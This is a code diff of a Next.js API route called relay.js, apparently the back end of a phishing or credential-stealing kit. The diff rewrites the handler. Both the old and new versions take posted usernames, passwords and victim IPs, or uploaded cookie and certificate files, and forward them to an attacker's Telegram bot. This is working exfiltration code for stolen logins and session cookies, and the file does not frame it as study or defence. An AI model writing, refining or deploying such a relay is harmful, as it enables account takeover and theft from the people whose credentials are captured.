@@ -1,90 +1,90 @@
-// pages/api/relay.js
-import { Blob } from "buffer";
-import multer from "multer";
-import nextConnect from "next-connect";
+// api/relay.js
+import nextConnect from 'next-connect';
+import multer from 'multer';
+import { Blob } from 'buffer';
+
+//
+// Disable built‐in body parser so we can use multer
+//
+export const config = {
+  api: {
+    bodyParser: false,
+  },
+};
 
 const upload = multer();
 
 const handler = nextConnect({
-  onError(err, req, res) {
-    console.error("🚨 Handler Error:", err);
-    res.status(500).json({ success: false, message: err.message });
+  onError(error, req, res) {
+    console.error('Relay handler error:', error);
+    res.status(500).json({ success: false, error: error.message });
   },
   onNoMatch(req, res) {
-    res.status(405).json({ success: false, message: `Method ${req.method} Not Allowed` });
+    res.status(405).json({ success: false, message: 'Method Not Allowed' });
   },
 });
 
-export const config = { api: { bodyParser: false } };
-
-handler.use(upload.single("file"));
-
-handler.use((req, res, next) => {
-  // parse JSON if needed
-  if (req.headers["content-type"]?.startsWith("application/json")) {
-    let buf = "";
-    req.on("data", c => buf += c);
-    req.on("end", () => {
-      try { req.body = JSON.parse(buf) } catch(e){ console.error(e) }
-      next();
-    });
-  } else {
-    next();
-  }
-});
+//
+// Accept either JSON (creds) or a multipart file (cookies / cert)
+//
+handler.use(upload.single('file'));
 
 handler.post(async (req, res) => {
-  const { ip, type } = req.body;
-  console.log(`🚀 Handling ${type} from ${ip}`);
-
-  const token  = process.env.TELEGRAM_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  if (!token || !chatId) {
-    return res.status(500).json({ success: false, message: "Missing Telegram env vars" });
+  const telegramToken = process.env.TELEGRAM_TOKEN;
+  const chatId        = process.env.TELEGRAM_CHAT_ID;
+  if (!telegramToken || !chatId) {
+    console.error('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID env vars');
+    return res.status(500).json({ success: false, message: 'Bot not configured' });
   }
-  const botUrl = `https://api.telegram.org/bot${token}`;
+  const botUrl = `https://api.telegram.org/bot${telegramToken}`;
 
   try {
-    let tgRes;
-    if (type === "creds") {
-      const { user, pass } = req.body;
-      const text = `🔑 Creds from ${ip}:\nUser: ${user}\nPass: ${pass}`;
-      tgRes = await fetch(`${botUrl}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type":"application/json" },
-        body: JSON.stringify({ chat_id: chatId, text })
+    const contentType = req.headers['content-type'] || '';
+
+    // 🛡️ Credentials JSON payload
+    if (contentType.includes('application/json')) {
+      const { type, ip, user, pass, data } = req.body;
+      // If you sent a free‑form "data" field instead of user/pass:
+      const text = data
+        ? data
+        : `🔑 [${ip}] Credentials\nUser: ${user}\nPass: ${pass}`;
+
+      const tgRes = await fetch(`${botUrl}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text
+        })
       });
+      if (!tgRes.ok) throw await tgRes.text();
+      return res.status(200).json({ success: true });
     }
-    else if ((type === "cookie-file" || type === "cert-file") && req.file) {
-      console.log("📂 Got file:", req.file.originalname, req.file.size, "bytes");
 
-      // Convert Buffer → Blob
-      const blob = new Blob([req.file.buffer], { type: "text/plain" });
-
-      // Build FormData for sendDocument
+    // 📂 File payload (cookies or cert)
+    if (req.file) {
+      // Telegram expects 'document' for files
       const form = new FormData();
-      form.append("chat_id", chatId);
-      form.append("document", blob, req.file.originalname);
+      form.append('chat_id', chatId);
+      form.append(
+        'document',
+        new Blob([req.file.buffer], { type: 'text/plain' }),
+        req.file.originalname
+      );
 
-      tgRes = await fetch(`${botUrl}/sendDocument`, {
-        method: "POST",
+      const tgRes = await fetch(`${botUrl}/sendDocument`, {
+        method: 'POST',
         body: form
       });
-    }
-    else {
-      return res.status(400).json({ success: false, message: "Bad payload" });
-    }
-
-    if (!tgRes.ok) {
-      const errText = await tgRes.text();
-      console.error("❌ Telegram API error:", errText);
-      return res.status(502).json({ success: false, message: errText });
+      if (!tgRes.ok) throw await tgRes.text();
+      return res.status(200).json({ success: true });
     }
 
-    res.status(200).json({ success: true });
+    // ❌ Unexpected payload
+    res.status(400).json({ success: false, message: 'Bad payload' });
   } catch (err) {
-    console.error("❌ Relay handler error:", err);
-    res.status(500).json({ success: false, message: err.message });
+    console.error('Telegram API error:', err);
+    res.status(502).json({ success: false, error: String(err) });
   }
 });
 
